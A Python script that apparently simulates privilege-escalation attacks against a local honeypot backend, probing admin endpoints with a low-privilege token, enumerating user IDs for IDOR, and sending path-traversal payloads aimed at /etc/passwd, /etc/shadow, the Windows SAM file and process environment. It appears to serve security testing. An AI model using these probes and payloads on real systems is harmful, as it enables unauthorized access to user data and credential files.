#!/usr/bin/env python3
"""
Privilege Escalation Attack Simulation
Tests broken access control and privilege escalation
"""

import time
import requests
from attack_utils import RealisticAttacker

BASE_URL = "http://localhost:3001"
attacker = RealisticAttacker(BASE_URL)


def bootstrap_low_priv_user():
    """Create or reuse a normal user so admin probes use a valid non-admin token."""
    return attacker.register_or_login(
        email="lowpriv@example.com",
        password="password123",
        name="Low Privilege User",
    )


def test_admin_access_without_auth():
    """Test admin endpoints with a valid low-privilege token."""
    print("Testing Admin Access With Non-Admin Token...")
    print(f"Target: {BASE_URL}/api/admin/*\n")

    account = bootstrap_low_priv_user()
    token = account.get("token") if account else None
    if not token:
        print("   Could not obtain a non-admin token. Skipping admin token probes.")
        return

    headers = attacker.auth_headers(token)
    admin_endpoints = [
        "/api/admin/users",
        "/api/admin/export",
        "/api/admin/logs",
    ]

    for endpoint in admin_endpoints:
        try:
            response = requests.get(f"{BASE_URL}{endpoint}", headers=headers, timeout=5)

            print(f"Endpoint: {endpoint}")
            print(f"   Status: {response.status_code}")

            if response.status_code == 200:
                print("   PRIVILEGE ESCALATION: non-admin token reached admin data!")
                print(f"   Response: {str(response.json())[:100]}...")
            elif response.status_code == 401:
                print("   Properly protected")
            else:
                print(f"   Response body: {response.text[:120]}")

            time.sleep(0.3)

        except Exception as e:
            print(f"   Error: {e}")


def test_idor():
    """Test Insecure Direct Object Reference using real Mongo user IDs."""
    print("\nTesting IDOR (Insecure Direct Object Reference)...")
    print(f"Target: {BASE_URL}/api/users?id=PAYLOAD\n")

    account = bootstrap_low_priv_user()
    token = account.get("token") if account else None
    user_ids = attacker.fetch_user_ids(token=token, limit=10)
    if account and account.get("user", {}).get("id"):
        user_ids.append(account["user"]["id"])
    user_ids = list(dict.fromkeys(user_ids))

    if not user_ids:
        print("   No real user IDs found yet. Create a few accounts and rerun this probe.")
        return

    for user_id in user_ids:
        try:
            response = requests.get(
                f"{BASE_URL}/api/users",
                params={"id": user_id},
                timeout=5,
            )

            print(f"User ID: {user_id}")
            print(f"   Status: {response.status_code}")

            if response.status_code == 200:
                data = response.json()
                if "user" in data:
                    print("   IDOR: accessed user data without authorization!")
                    print(f"   Email: {data['user'].get('email', 'N/A')}")

            time.sleep(0.3)

        except Exception as e:
            print(f"   Error: {e}")


def test_lfi():
    """Test Local File Inclusion with a valid non-admin token."""
    print("\nTesting LFI (Local File Inclusion)...")
    print(f"Target: {BASE_URL}/api/admin/export?file=PAYLOAD\n")

    account = bootstrap_low_priv_user()
    token = account.get("token") if account else None
    if not token:
        print("   Could not obtain a non-admin token. Skipping LFI probes.")
        return

    headers = attacker.auth_headers(token)
    lfi_payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "../../../etc/hosts",
        "../../../proc/self/environ",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "users.csv",
        "../../../etc/shadow",
        "../../../var/log/apache2/access.log",
    ]

    for payload in lfi_payloads:
        try:
            response = requests.get(
                f"{BASE_URL}/api/admin/export",
                params={"file": payload},
                headers=headers,
                timeout=5,
            )

            print(f"Payload: {payload}")
            print(f"   Status: {response.status_code}")

            if response.status_code == 200:
                data = response.json()
                print("   LFI: file export path accepted!")
                print(f"   Response: {str(data)[:100]}...")

            time.sleep(0.3)

        except Exception as e:
            print(f"   Error: {e}")


if __name__ == "__main__":
    if not attacker.check_backend_health():
        print("Backend is not reachable on /health. Start the honeypot first.")
    else:
        test_admin_access_without_auth()
        test_idor()
        test_lfi()
        print("\nPrivilege escalation tests completed")
